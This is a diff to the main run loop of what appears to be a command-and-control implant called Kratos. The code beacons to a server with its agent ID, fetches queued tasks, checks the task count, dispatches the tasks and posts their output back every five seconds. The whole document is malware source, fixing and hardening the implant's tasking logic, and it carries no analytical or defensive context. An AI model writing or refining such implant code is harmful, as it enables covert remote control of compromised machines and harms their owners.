@@ -13,40 +13,46 @@ BOOL Kratos::Run( ) {
 	packager->NewPacker( );
 	packager->PrepareMetaData( this->AgentID );
 	const INT32 RequestBase = packager->PackerSize( );
-	packager->Pack4( MSG_GETTASK );
 
 	for ( ;; ) {
+		if ( ! packager->ResetPackerIndex( RequestBase ) ) {
+			return FALSE;
+		}
+		packager->Pack4( MSG_GETTASK );
+
 		DEBUG_LOG("[+] Getting Task");
 		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize() ) ) {
 			return FALSE;
 		}
 
 		packager->NewUnPacker( net->Data( ), net->DataSize( ) );
+		INT32 TotalTasks = packager->UnPack4( );
 
-		INT32 RespCode = packager->UnPack4( );
+		if ( TotalTasks == RESP_NO_TASKS ) {
+			DEBUG_LOG("[+] No Task");
+			Sleep( 5000 );
+			continue;
+		}
+
+		if ( TotalTasks <= 0 || TotalTasks > 64 ) {
+			DEBUG_LOG("[!] Invalid task count");
+			Sleep( 5000 );
+			continue;
+		}
+
+		DEBUG_LOG("[+] Got Tasks!");
 		if ( ! packager->ResetPackerIndex( RequestBase ) ) {
 			return FALSE;
 		}
+		packager->Pack4( MSG_OUTPUT );
+		this->Dispatch( TotalTasks );
 
-		if ( RespCode != RESP_NO_TASKS ) {
-			
-
-			packager->Pack4( MSG_OUTPUT );
-			this->Dispatch(  );
-		}
-		else {
-			DEBUG_LOG("[+] No Task");
-			packager->Pack4( MSG_GETTASK );
+		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize() ) ) {
+			return FALSE;
 		}
 
-		Sleep(5000);
-
-		
-
-
+		Sleep( 5000 );
 	}
-
-
 
 	return TRUE;
 }
